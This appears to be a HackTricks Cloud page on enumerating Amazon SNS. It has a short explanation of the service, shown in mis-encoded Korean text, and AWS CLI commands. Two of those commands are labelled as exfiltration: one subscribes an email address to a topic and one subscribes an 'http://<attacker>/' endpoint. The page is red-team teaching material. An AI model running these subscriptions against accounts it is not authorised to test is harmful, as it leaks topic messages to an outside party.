# AWS - SNS Enum

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## SNS

Amazon Simple Notification Service (Amazon SNS)ëŠ” **ì™„ì „ ê´€ë¦¬í˜• ë©”ì‹œì§• ì„œë¹„ìŠ¤**ë¡œ ì„¤ëª…ë©ë‹ˆë‹¤. ì´ëŠ” **ì• í”Œë¦¬ì¼€ì´ì…˜ ê°„** (A2A) ë° **ì• í”Œë¦¬ì¼€ì´ì…˜-ì‚¬ëŒ ê°„** (A2P) í†µì‹  ìœ í˜•ì„ ëª¨ë‘ ì§€ì›í•©ë‹ˆë‹¤.

A2A í†µì‹ ì˜ ì£¼ìš” ê¸°ëŠ¥ì—ëŠ” **ë°œí–‰/êµ¬ë… (pub/sub) ë©”ì»¤ë‹ˆì¦˜**ì´ í¬í•¨ë©ë‹ˆë‹¤. ì´ëŸ¬í•œ ë©”ì»¤ë‹ˆì¦˜ì€ **ì£¼ì œ**ë¥¼ ë„ì…í•˜ì—¬ ê³ ì²˜ë¦¬ëŸ‰, **í‘¸ì‹œ ê¸°ë°˜, ë‹¤ëŒ€ë‹¤ ë©”ì‹œì§•**ì„ ê°€ëŠ¥í•˜ê²Œ í•©ë‹ˆë‹¤. ì´ ê¸°ëŠ¥ì€ ë¶„ì‚° ì‹œìŠ¤í…œ, ë§ˆì´í¬ë¡œì„œë¹„ìŠ¤ ë° ì´ë²¤íŠ¸ ê¸°ë°˜ ì„œë²„ë¦¬ìŠ¤ ì•„í‚¤í…ì²˜ì™€ ê´€ë ¨ëœ ì‹œë‚˜ë¦¬ì˜¤ì—ì„œ ë§¤ìš° ìœ ë¦¬í•©ë‹ˆë‹¤. ì´ëŸ¬í•œ ì£¼ì œë¥¼ í™œìš©í•˜ì—¬ ë°œí–‰ ì‹œìŠ¤í…œì€ **ë‹¤ì–‘í•œ êµ¬ë… ì‹œìŠ¤í…œ**ì— ë©”ì‹œì§€ë¥¼ íš¨ìœ¨ì ìœ¼ë¡œ ë°°í¬í•  ìˆ˜ ìˆìœ¼ë©°, íŒ¬ì•„ì›ƒ ë©”ì‹œì§• íŒ¨í„´ì„ ì´‰ì§„í•©ë‹ˆë‹¤.

### **SQSì™€ì˜ ì°¨ì´ì **

**SQS**ëŠ” **í ê¸°ë°˜** ì„œë¹„ìŠ¤ë¡œ, ë©”ì‹œì§€ê°€ **ë‹¨ì¼ ì†Œë¹„ì**ì— ì˜í•´ ì²˜ë¦¬ë˜ë„ë¡ ë³´ì¥í•˜ëŠ” í¬ì¸íŠ¸ íˆ¬ í¬ì¸íŠ¸ í†µì‹ ì„ í—ˆìš©í•©ë‹ˆë‹¤. ì´ëŠ” **ìµœì†Œ í•œ ë²ˆì˜ ì „ë‹¬**ì„ ì œê³µí•˜ë©°, í‘œì¤€ ë° FIFO íë¥¼ ì§€ì›í•˜ê³ , ì¬ì‹œë„ ë° ì§€ì—° ì²˜ë¦¬ë¥¼ ìœ„í•œ ë©”ì‹œì§€ ë³´ì¡´ì„ í—ˆìš©í•©ë‹ˆë‹¤.\
ë°˜ë©´ì—, **SNS**ëŠ” **ë°œí–‰/êµ¬ë… ê¸°ë°˜ ì„œë¹„ìŠ¤**ë¡œ, ë©”ì‹œì§€ë¥¼ **ì—¬ëŸ¬ êµ¬ë…ì**ì—ê²Œ ë™ì‹œì— ë°©ì†¡í•˜ì—¬ **ì¼ëŒ€ë‹¤** í†µì‹ ì„ ê°€ëŠ¥í•˜ê²Œ í•©ë‹ˆë‹¤. ì´ëŠ” **ì´ë©”ì¼, SMS, Lambda í•¨ìˆ˜, HTTP/HTTPSì™€ ê°™ì€ ë‹¤ì–‘í•œ êµ¬ë… ì—”ë“œí¬ì¸íŠ¸**ë¥¼ ì§€ì›í•˜ë©°, íƒ€ê²Ÿ ë©”ì‹œì§€ ì „ë‹¬ì„ ìœ„í•œ í•„í„°ë§ ë©”ì»¤ë‹ˆì¦˜ì„ ì œê³µí•©ë‹ˆë‹¤.\
ë‘ ì„œë¹„ìŠ¤ ëª¨ë‘ ë¶„ì‚° ì‹œìŠ¤í…œì—ì„œ êµ¬ì„± ìš”ì†Œ ê°„ì˜ ë””ì»¤í”Œë§ì„ ê°€ëŠ¥í•˜ê²Œ í•˜ì§€ë§Œ, SQSëŠ” í í†µì‹ ì— ì¤‘ì ì„ ë‘ê³ , SNSëŠ” ì´ë²¤íŠ¸ ê¸°ë°˜, íŒ¬ì•„ì›ƒ í†µì‹  íŒ¨í„´ì„ ê°•ì¡°í•©ë‹ˆë‹¤.

### **Enumeration**
```bash
# Get topics & subscriptions
aws sns list-topics
aws sns list-subscriptions
aws sns list-subscriptions-by-topic --topic-arn <arn>

# Check privescs & post-exploitation
aws sns publish --region <region> \
--topic-arn "arn:aws:sns:us-west-2:123456789012:my-topic" \
--message file://message.txt

# Exfiltrate through email
## You will receive an email to confirm the subscription
aws sns subscribe --region <region> \
--topic-arn arn:aws:sns:us-west-2:123456789012:my-topic \
--protocol email \
--notification-endpoint my-email@example.com

# Exfiltrate through web server
## You will receive an initial request with a URL in the field "SubscribeURL"
## that you need to access to confirm the subscription
aws sns subscribe --region <region>\
--protocol http \
--notification-endpoint http://<attacker>/ \
--topic-arn <arn>
```
{% hint style="danger" %}
**FIFO ìœ í˜•ì˜ topic**ì¸ ê²½ìš°, **SQS** í”„ë¡œí† ì½œì„ ì‚¬ìš©í•˜ëŠ” êµ¬ë…ìë§Œ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ (HTTP ë˜ëŠ” HTTPSëŠ” ì‚¬ìš©í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤).

ë˜í•œ, `--topic-arn`ì— ì§€ì—­ì´ í¬í•¨ë˜ì–´ ìˆë”ë¼ë„ **`--region`**ì— ì˜¬ë°”ë¥¸ ì§€ì—­ì„ ì§€ì •í•´ì•¼ í•©ë‹ˆë‹¤. ê·¸ë ‡ì§€ ì•Šìœ¼ë©´ ì ‘ê·¼ ê¶Œí•œì´ ì—†ë‹¤ëŠ” ì˜¤ë¥˜ê°€ ë°œìƒí•  ìˆ˜ ìˆì§€ë§Œ ì‹¤ì œ ë¬¸ì œëŠ” ì§€ì—­ ì„¤ì •ì…ë‹ˆë‹¤.
{% endhint %}

#### Unauthenticated Access

{% content-ref url="../aws-unauthenticated-enum-access/aws-sns-unauthenticated-enum.md" %}
[aws-sns-unauthenticated-enum.md](../aws-unauthenticated-enum-access/aws-sns-unauthenticated-enum.md)
{% endcontent-ref %}

#### Privilege Escalation

{% content-ref url="../aws-privilege-escalation/aws-sns-privesc.md" %}
[aws-sns-privesc.md](../aws-privilege-escalation/aws-sns-privesc.md)
{% endcontent-ref %}

#### Post Exploitation

{% content-ref url="../aws-post-exploitation/aws-sns-post-exploitation.md" %}
[aws-sns-post-exploitation.md](../aws-post-exploitation/aws-sns-post-exploitation.md)
{% endcontent-ref %}

#### Persistence

{% content-ref url="../aws-persistence/aws-sns-persistence.md" %}
[aws-sns-persistence.md](../aws-persistence/aws-sns-persistence.md)
{% endcontent-ref %}

## References

* [https://aws.amazon.com/about-aws/whats-new/2022/01/amazon-sns-attribute-based-access-controls/](https://aws.amazon.com/about-aws/whats-new/2022/01/amazon-sns-attribute-based-access-controls/)

{% hint style="success" %}
AWS Hacking í•™ìŠµ ë° ì—°ìŠµ:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking í•™ìŠµ ë° ì—°ìŠµ: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›</summary>

* [**êµ¬ë… í”Œëœ**](https://github.com/sponsors/carlospolop)ì„ í™•ì¸í•˜ì„¸ìš”!
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**telegram ê·¸ë£¹**](https://t.me/peass)ì— ê°€ì…í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)ì„ íŒ”ë¡œìš°í•˜ì„¸ìš”.
* PRì„ ì œì¶œí•˜ì—¬ [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
{% endhint %}
